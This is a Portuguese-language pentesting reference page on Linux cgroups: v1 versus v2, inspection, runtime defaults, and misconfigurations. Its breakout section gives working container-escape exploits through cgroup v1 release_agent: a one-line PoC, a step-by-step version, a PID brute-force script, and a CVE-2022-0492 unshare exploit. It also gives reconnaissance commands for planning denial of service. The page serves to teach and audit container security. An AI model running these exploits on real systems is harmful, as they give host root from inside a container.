# cgroups

{{#include ../../../../banners/hacktricks-training.md}}

## Visão geral

Os **control groups** do Linux são o mecanismo do kernel usado para agrupar processos para fins de contabilização, limitação, priorização e aplicação de políticas. Se os namespaces tratam principalmente de isolar a visão dos recursos, os cgroups tratam principalmente de controlar **quanto** desses recursos um conjunto de processos pode consumir e, em alguns casos, **com quais classes de recursos** eles podem interagir. Os containers dependem constantemente de cgroups, mesmo quando o usuário nunca os examina diretamente, porque quase todo runtime moderno precisa de uma forma de informar ao kernel: "estes processos pertencem a este workload, e estas são as regras de recursos aplicáveis a eles".

É por isso que os container engines colocam um novo container em sua própria subtree de cgroup. Quando a árvore de processos está nesse local, o runtime pode limitar a memória, restringir o número de PIDs, definir o peso do uso da CPU, regular I/O e restringir o acesso a devices. Em um ambiente de produção, isso é essencial tanto para a segurança multi-tenant quanto para uma higiene operacional básica. Um container sem controles de recursos significativos pode conseguir esgotar a memória, inundar o sistema com processos ou monopolizar a CPU e o I/O de maneiras que tornam o host ou os workloads vizinhos instáveis.

Do ponto de vista de segurança, os cgroups são importantes de duas formas distintas. Primeiro, limites de recursos ausentes ou inadequados permitem ataques simples de denial-of-service. Segundo, alguns recursos dos cgroups, especialmente em configurações antigas de **cgroup v1**, historicamente criaram poderosos primitivos de breakout quando podiam ser gravados de dentro de um container.

## v1 Vs v2

Há dois modelos principais de cgroup em uso. O **cgroup v1** expõe várias hierarquias de controllers, e writeups antigos de exploits frequentemente se concentram nas semânticas estranhas e, às vezes, excessivamente poderosas disponíveis nesse modelo. O **cgroup v2** introduz uma hierarquia mais unificada e, em geral, um comportamento mais limpo. As distribuições modernas preferem cada vez mais o cgroup v2, mas ambientes mistos ou legados ainda existem, o que significa que ambos os modelos continuam relevantes ao analisar sistemas reais.

A diferença é importante porque algumas das histórias mais famosas de container breakout, como os abusos de **`release_agent`** no cgroup v1, estão especificamente relacionadas ao comportamento antigo dos cgroups. Um leitor que encontre um exploit de cgroup em um blog e tente aplicá-lo cegamente a um sistema moderno que utiliza apenas cgroup v2 provavelmente entenderá mal o que é realmente possível no alvo.

## Inspeção

A maneira mais rápida de ver onde o seu shell atual está localizado é:
```bash
cat /proc/self/cgroup
findmnt -T /sys/fs/cgroup
```
O arquivo `/proc/self/cgroup` mostra os caminhos de cgroup associados ao processo atual. Em um host moderno com cgroup v2, geralmente você verá uma entrada unificada. Em hosts mais antigos ou híbridos, pode haver vários caminhos de controladores v1. Depois de conhecer o caminho, você pode inspecionar os arquivos correspondentes em `/sys/fs/cgroup` para ver os limites e o uso atual.

Em um host com cgroup v2, os comandos a seguir são úteis:
```bash
ls -l /sys/fs/cgroup
cat /sys/fs/cgroup/cgroup.controllers
cat /sys/fs/cgroup/cgroup.subtree_control
```
Esses arquivos revelam quais controladores existem e quais deles são delegados a cgroups filhos. Esse modelo de delegação é importante em ambientes rootless e gerenciados pelo systemd, nos quais o runtime pode conseguir controlar apenas o subconjunto de funcionalidades de cgroup que a hierarquia pai realmente delega.

## Laboratório

Uma maneira de observar cgroups na prática é executar um container com memória limitada:
```bash
docker run --rm -it --memory=256m debian:stable-slim bash
cat /proc/self/cgroup
cat /sys/fs/cgroup/memory.max 2>/dev/null || cat /sys/fs/cgroup/memory.limit_in_bytes 2>/dev/null
```
Você também pode tentar um container limitado por PID:
```bash
docker run --rm -it --pids-limit=64 debian:stable-slim bash
cat /sys/fs/cgroup/pids.max 2>/dev/null
```
Esses exemplos são úteis porque ajudam a conectar a flag de runtime à interface de arquivos do kernel. O runtime não aplica a regra por mágica; ele grava as configurações relevantes do cgroup e então permite que o kernel as aplique à árvore de processos.

## Uso do Runtime

Docker, Podman, containerd e CRI-O dependem de cgroups como parte da operação normal. As diferenças geralmente não estão relacionadas ao uso ou não de cgroups, mas a **quais padrões escolhem**, **como interagem com o systemd**, **como funciona a delegação rootless** e **quanto da configuração é controlado no nível do engine em comparação com o nível da orquestração**.

No Kubernetes, as solicitações e os limites de recursos acabam se tornando configurações de cgroup no node. O caminho do YAML do Pod até a aplicação pelo kernel passa pelo kubelet, pelo runtime CRI e pelo runtime OCI, mas os cgroups ainda são o mecanismo do kernel que finalmente aplica a regra. Em ambientes Incus/LXC, os cgroups também são amplamente usados, especialmente porque os system containers geralmente expõem uma árvore de processos mais rica e expectativas operacionais mais semelhantes às de uma VM.

## Misconfigurações e Breakouts

O caso clássico de segurança de cgroups é o mecanismo gravável **`release_agent` do cgroup v1**. Nesse modelo, se um atacante pudesse gravar nos arquivos de cgroup corretos, habilitar `notify_on_release` e controlar o caminho armazenado em `release_agent`, o kernel poderia acabar executando um caminho escolhido pelo atacante nos initial namespaces do host quando o cgroup ficasse vazio. É por isso que writeups mais antigos dão tanta atenção à capacidade de escrita dos controladores de cgroup, às opções de montagem e às condições de namespace/capability.

Mesmo quando `release_agent` não está disponível, erros de configuração de cgroup ainda são importantes. O acesso excessivamente amplo a devices pode tornar devices do host acessíveis a partir do container. A ausência de limites de memória e de PID pode transformar uma simples execução de código em um DoS do host. A delegação fraca de cgroups em cenários rootless também pode induzir os defensores a presumir que existe uma restrição quando, na realidade, o runtime nunca conseguiu aplicá-la.

### Contexto de `release_agent`

A técnica `release_agent` aplica-se somente ao **cgroup v1**. A ideia básica é que, quando o último processo de um cgroup termina e `notify_on_release=1` está definido, o kernel executa o programa cujo caminho está armazenado em `release_agent`. Essa execução ocorre nos **initial namespaces do host**, o que transforma um `release_agent` gravável em uma primitiva de escape de container.

Para que a técnica funcione, o atacante geralmente precisa de:

- uma hierarquia **cgroup v1** gravável
- capacidade de criar ou usar um child cgroup
- capacidade de definir `notify_on_release`
- capacidade de gravar um caminho em `release_agent`
- um caminho que seja resolvido como um executável do ponto de vista do host

### PoC Clássico

O PoC histórico de uma linha é:
```bash
d=$(dirname $(ls -x /s*/fs/c*/*/r* | head -n1))
mkdir -p "$d/w"
echo 1 > "$d/w/notify_on_release"
t=$(sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab)
touch /o
echo "$t/c" > "$d/release_agent"
cat <<'EOF' > /c
#!/bin/sh
ps aux > "$t/o"
EOF
chmod +x /c
sh -c "echo 0 > $d/w/cgroup.procs"
sleep 1
cat /o
```
Este PoC grava um caminho de payload em `release_agent`, dispara a liberação do cgroup e, em seguida, lê o arquivo de saída gerado no host.

### Explicação passo a passo

A mesma ideia é mais fácil de entender quando dividida em etapas.

1. Crie e prepare um cgroup gravável:
```bash
mkdir /tmp/cgrp
mount -t cgroup -o rdma cgroup /tmp/cgrp    # or memory if available in v1
mkdir /tmp/cgrp/x
echo 1 > /tmp/cgrp/x/notify_on_release
```
2. Identifique o caminho do host correspondente ao sistema de arquivos do container:
```bash
host_path=$(sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab)
echo "$host_path/cmd" > /tmp/cgrp/release_agent
```
3. Coloque um payload que ficará visível a partir do caminho do host:
```bash
cat <<'EOF' > /cmd
#!/bin/sh
ps aux > /output
EOF
chmod +x /cmd
```
4. Acione a execução tornando o cgroup vazio:
```bash
sh -c "echo $$ > /tmp/cgrp/x/cgroup.procs"
sleep 1
cat /output
```
O efeito é a execução do payload no lado do host com privilégios de root do host. Em um exploit real, o payload geralmente grava um arquivo de prova, inicia um reverse shell ou modifica o estado do host.

### Variante de caminho relativo usando `/proc/<pid>/root`

Em alguns ambientes, o caminho do host para o sistema de arquivos do container não é óbvio ou fica oculto pelo storage driver. Nesse caso, o caminho do payload pode ser expresso por meio de `/proc/<pid>/root/...`, onde `<pid>` é um PID do host pertencente a um processo no container atual. Essa é a base da variante de brute-force de caminho relativo:
```bash
#!/bin/sh

OUTPUT_DIR="/"
MAX_PID=65535
CGROUP_NAME="xyx"
CGROUP_MOUNT="/tmp/cgrp"
PAYLOAD_NAME="${CGROUP_NAME}_payload.sh"
PAYLOAD_PATH="${OUTPUT_DIR}/${PAYLOAD_NAME}"
OUTPUT_NAME="${CGROUP_NAME}_payload.out"
OUTPUT_PATH="${OUTPUT_DIR}/${OUTPUT_NAME}"

sleep 10000 &

cat > ${PAYLOAD_PATH} << __EOF__
#!/bin/sh
OUTPATH=\$(dirname \$0)/${OUTPUT_NAME}
ps -eaf > \${OUTPATH} 2>&1
__EOF__

chmod a+x ${PAYLOAD_PATH}

mkdir ${CGROUP_MOUNT}
mount -t cgroup -o memory cgroup ${CGROUP_MOUNT}
mkdir ${CGROUP_MOUNT}/${CGROUP_NAME}
echo 1 > ${CGROUP_MOUNT}/${CGROUP_NAME}/notify_on_release

TPID=1
while [ ! -f ${OUTPUT_PATH} ]
do
if [ $((${TPID} % 100)) -eq 0 ]
then
echo "Checking pid ${TPID}"
if [ ${TPID} -gt ${MAX_PID} ]
then
echo "Exiting at ${MAX_PID}"
exit 1
fi
fi
echo "/proc/${TPID}/root${PAYLOAD_PATH}" > ${CGROUP_MOUNT}/release_agent
sh -c "echo \$\$ > ${CGROUP_MOUNT}/${CGROUP_NAME}/cgroup.procs"
TPID=$((${TPID} + 1))
done

sleep 1
cat ${OUTPUT_PATH}
```
O truque relevante aqui não é o brute force em si, mas o formato do path: `/proc/<pid>/root/...` permite que o kernel resolva um arquivo dentro do sistema de arquivos do container a partir do namespace do host, mesmo quando o path de armazenamento direto no host não é conhecido antecipadamente.

### Variante do CVE-2022-0492

Em 2022, o CVE-2022-0492 mostrou que a escrita em `release_agent` no cgroup v1 não verificava corretamente `CAP_SYS_ADMIN` no **initial** user namespace. Isso tornou a técnica muito mais acessível em kernels vulneráveis, porque um processo do container que pudesse montar uma hierarquia de cgroups poderia escrever em `release_agent` sem já estar privilegiado no user namespace do host.

Exploit mínimo:
```bash
apk add --no-cache util-linux
unshare -UrCm sh -c '
mkdir /tmp/c
mount -t cgroup -o memory none /tmp/c
echo 1 > /tmp/c/notify_on_release
echo /proc/self/exe > /tmp/c/release_agent
(sleep 1; echo 0 > /tmp/c/cgroup.procs) &
while true; do sleep 1; done
'
```
Em um kernel vulnerável, o host executa `/proc/self/exe` com privilégios de root do host.

Para abuso prático, comece verificando se o ambiente ainda expõe caminhos cgroup-v1 graváveis ou acesso perigoso a dispositivos:
```bash
mount | grep cgroup
find /sys/fs/cgroup -maxdepth 3 -name release_agent 2>/dev/null -exec ls -l {} \;
find /sys/fs/cgroup -maxdepth 3 -writable 2>/dev/null | head -n 50
ls -l /dev | head -n 50
```
Se `release_agent` estiver presente e puder ser escrito, você já está em território de legacy-breakout:
```bash
find /sys/fs/cgroup -maxdepth 3 -name notify_on_release 2>/dev/null
find /sys/fs/cgroup -maxdepth 3 -name cgroup.procs 2>/dev/null | head
```
Se o próprio caminho do cgroup não permitir um escape, o próximo uso prático costuma ser denial of service ou reconhecimento:
```bash
cat /sys/fs/cgroup/pids.max 2>/dev/null
cat /sys/fs/cgroup/memory.max 2>/dev/null
cat /sys/fs/cgroup/cpu.max 2>/dev/null
```
Esses comandos informam rapidamente se a workload tem espaço para executar um fork-bomb, consumir memória agressivamente ou abusar de uma interface legada de cgroup com permissão de escrita.

## Verificações

Ao revisar um alvo, o objetivo das verificações de cgroup é descobrir qual modelo de cgroup está em uso, se o container consegue acessar caminhos de controllers com permissão de escrita e se primitivas antigas de breakout, como `release_agent`, são sequer relevantes.
```bash
cat /proc/self/cgroup                                      # Current process cgroup placement
mount | grep cgroup                                        # cgroup v1/v2 mounts and mount options
find /sys/fs/cgroup -maxdepth 3 -name release_agent 2>/dev/null   # Legacy v1 breakout primitive
cat /proc/1/cgroup                                         # Compare with PID 1 / host-side process layout
```
O que é interessante aqui:

- Se `mount | grep cgroup` mostrar **cgroup v1**, writeups mais antigos sobre breakout se tornam mais relevantes.
- Se `release_agent` existir e estiver acessível, isso merece imediatamente uma investigação mais aprofundada.
- Se a hierarquia de cgroups visível for gravável e o container também tiver capabilities fortes, o ambiente merece uma revisão muito mais cuidadosa.

Se você descobrir **cgroup v1**, mounts de controllers graváveis e um container que também tenha capabilities fortes ou proteção fraca de seccomp/AppArmor, essa combinação merece atenção cuidadosa. cgroups costumam ser tratados como um tópico entediante de gerenciamento de recursos, mas historicamente fizeram parte de algumas das cadeias de escape de containers mais instrutivas, precisamente porque a fronteira entre "controle de recursos" e "influência sobre o host" nem sempre era tão clara quanto se supunha.

## Padrões do Runtime

| Runtime / plataforma | Estado padrão | Comportamento padrão | Enfraquecimento manual comum |
| --- | --- | --- | --- |
| Docker Engine | Habilitado por padrão | Containers são colocados automaticamente em cgroups; limites de recursos são opcionais, a menos que sejam definidos com flags | omitir `--memory`, `--pids-limit`, `--cpus`, `--blkio-weight`; `--device`; `--privileged` |
| Podman | Habilitado por padrão | `--cgroups=enabled` é o padrão; os padrões do namespace de cgroup variam conforme a versão do cgroup (`private` no cgroup v2, `host` em algumas configurações de cgroup v1) | `--cgroups=disabled`, `--cgroupns=host`, acesso relaxado a devices, `--privileged` |
| Kubernetes | Habilitado por padrão através do runtime | Pods e containers são colocados em cgroups pelo runtime do node; o controle refinado de recursos depende de `resources.requests` / `resources.limits` | omitir requests/limits de recursos, acesso privilegiado a devices, configuração incorreta do runtime no nível do host |
| containerd / CRI-O | Habilitado por padrão | cgroups fazem parte do gerenciamento normal do ciclo de vida | configurações diretas do runtime que relaxam os controles de devices ou expõem interfaces legadas graváveis de cgroup v1 |

A distinção importante é que a **existência de cgroups** geralmente é padrão, enquanto **restrições úteis de recursos** costumam ser opcionais, a menos que sejam configuradas explicitamente.
{{#include ../../../../banners/hacktricks-training.md}}
